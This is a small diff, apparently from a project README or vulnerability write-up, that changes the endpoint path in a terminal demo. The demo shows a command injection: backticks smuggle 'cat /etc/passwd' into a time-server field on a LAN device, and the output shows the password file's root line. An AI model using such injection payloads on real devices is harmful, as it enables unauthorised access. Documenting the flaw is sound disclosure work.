@@ -75,6 +75,6 @@ $ cat project
          ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░                                               
                                                                                                                
 
-$ curl -X POST http://192.168.73.31/setTimeServer \
+$ curl -X POST http://192.168.73.31/setTimeServer.php \
 > -d "timeserver=0.pool.ntp.org`cat /etc/passwd`"
 0.pool.ntp.orgroot:x:0:0:root:/home/root:/bin/sh
